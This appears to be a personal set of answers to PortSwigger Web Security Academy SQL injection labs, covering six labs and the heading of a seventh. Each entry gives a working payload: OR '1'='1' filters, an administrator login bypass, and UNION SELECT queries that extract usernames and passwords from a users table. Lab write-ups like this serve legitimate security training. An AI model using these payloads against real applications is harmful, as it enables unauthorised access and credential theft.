# 1 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

https://ac691f8f1f1ade0ec09556480096009a.web-security-academy.net/filter?category=Food+&+Drink' or '1'='1


# 2 SQL injection vulnerability allowing login bypass

uname -> administrator
pass -> pass' or '1'='1


# 3 SQL injection UNION attack, determining the number of columns returned by the query

https://ac101f141ffe5241c02925c900cd00fb.web-security-academy.net/filter?category=Corporate+gifts' union select null,null,null--

# 4 SQL injection UNION attack, finding a column containing text

https://acc41f9a1e1d0567c0443b83007e0005.web-security-academy.net/filter?category=Corporate+gifts' union select null,'x3tSLc',null--

# 5 SQL injection UNION attack, retrieving data from other tables

https://acd91f8d1ed49ccdc0f3100900ea0060.web-security-academy.net/filter?category=Accessories' union select username,password from users--

# 6 SQL injection UNION attack, retrieving multiple values in a single column

https://acab1f321e54abdec0327ab800b70008.web-security-academy.net/filter?category=Corporate+gifts' union select null,username || '~' || password FROM users----

# 7 SQL injection attack, querying the database type and version on Oracle